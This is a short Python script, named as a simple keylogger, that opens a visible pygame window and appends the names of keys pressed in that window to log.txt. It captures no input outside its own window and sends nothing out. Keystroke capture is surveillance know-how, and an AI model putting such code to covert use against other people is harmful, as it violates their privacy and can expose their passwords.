import pygame

class SimpleKeylogger:
    def __init__(self):
        self.logger = ""
    
    def append_to_log(self, key_strike):
        self.logger += key_strike
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        self.logger = ""
    
    def start(self):
        pygame.init()
        pygame.display.set_mode((200, 200))  # Create a Pygame window
        
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    return
                elif event.type == pygame.KEYDOWN:
                    key_name = pygame.key.name(event.key)
                    
                    if key_name == "space":
                        key_strike = " "
                    else:
                        key_strike = " " + key_name + " "
                    
                    self.append_to_log(key_strike)

SimpleKeylogger().start()
